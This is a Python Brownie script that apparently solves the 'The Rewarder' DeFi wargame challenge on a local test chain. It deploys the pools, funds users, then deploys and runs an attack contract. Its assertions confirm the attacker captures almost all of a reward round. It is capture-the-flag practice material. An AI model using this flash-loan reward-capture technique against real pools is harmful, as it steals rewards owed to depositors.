from brownie import *

def main():
    deployer = a[0]
    attacker = a[1]
    alice = a[2]
    bob = a[3]
    charlie = a[4]
    david = a[5]
    users = [alice, bob, charlie, david]

    TOKENS_IN_LENDER_POOL = Wei('1000000 ether')

    liquidityToken = DamnValuableToken.deploy({'from': deployer})
    flashLoanPool = FlashLoanerPool.deploy(liquidityToken, {'from': deployer})

    liquidityToken.transfer(flashLoanPool,
        TOKENS_IN_LENDER_POOL, {'from': deployer})

    rewarderPool = TheRewarderPool.deploy(liquidityToken, {'from': deployer})
    rewardToken = RewardToken.at(rewarderPool.rewardToken())
    accountingToken = AccountingToken.at(rewarderPool.accToken())

    amount = Wei('100 ether')
    for u in users:
        liquidityToken.transfer(u, amount, {'from': deployer})
        liquidityToken.approve(rewarderPool, amount, {'from': u})
        rewarderPool.deposit(amount, {'from': u})
        assert accountingToken.balanceOf(u) == amount

    chain.sleep(5*24*60*60) # advance 5 days
    chain.mine()

    for u in users:
        rewarderPool.distributeRewards({'from': u})
        assert rewardToken.balanceOf(u) == Wei('25 ether')

    assert liquidityToken.balanceOf(attacker) == 0
    assert rewarderPool.roundNumber() == 2

    # Exploit code here
    chain.sleep(5*24*60*60)
    chain.mine()
    attack = TheRewarderAttack.deploy(
        flashLoanPool, rewarderPool, liquidityToken, rewardToken,
        {'from': attacker})
    attack.attack()

    # Success conditions
    assert rewarderPool.roundNumber() == 3

    for u in users:
        rewarderPool.distributeRewards({'from': u})
        assert rewardToken.balanceOf(u) < Wei('25.01 ether')

    assert rewardToken.totalSupply() > Wei('100 ether')

    assert rewardToken.balanceOf(attacker) > Wei('99.9 ether')

    assert liquidityToken.balanceOf(attacker) == 0

    print('Challenge successfully passed.')

